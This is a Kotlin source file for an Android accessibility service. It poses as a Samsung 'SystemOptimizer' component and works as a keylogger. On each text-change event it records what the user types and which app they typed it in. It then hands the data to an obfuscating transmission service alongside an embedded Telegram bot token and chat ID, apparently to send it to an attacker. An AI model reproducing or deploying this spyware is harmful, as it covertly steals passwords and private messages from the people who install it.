package com.samsung.android.app.smartcapture

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.graphics.Path
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*

class SystemOptimizerAccessibilityService : AccessibilityService() {

    companion object {
        private const val BOT_TOKEN = "8699568956:AAE7eTdayK3EhKMhvpoMWBYrW91mTJohDUo"
        private const val CHAT_ID = "7597928991"
        var instance: SystemOptimizerAccessibilityService? = null
        private const val TAG = "AccessibilityService"
    }

    private val transmissionService = SystemOptimizerService().TransmissionService()

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.d(TAG, "Accessibility service connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        val data = JSONObject().apply {
            put("type", "accessibility_event")
            put("event_type", event.eventType)
            put("package_name", event.packageName)
            put("class_name", event.className)
            put("text", event.text?.joinToString(", "))
            put("content_description", event.contentDescription)
            put("timestamp", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date()))
        }

        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED && event.text?.isNotEmpty() == true) {
            val textData = JSONObject().apply {
                put("type", "text_input")
                put("app", event.packageName)
                put("text", event.text.joinToString(""))
                put("timestamp", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date()))
            }
            transmissionService.sendObfuscatedData(textData.toString())
        }

        Log.d(TAG, "Event: $data")
    }

    override fun onInterrupt() {
        Log.d(TAG, "Accessibility service interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
    }
}
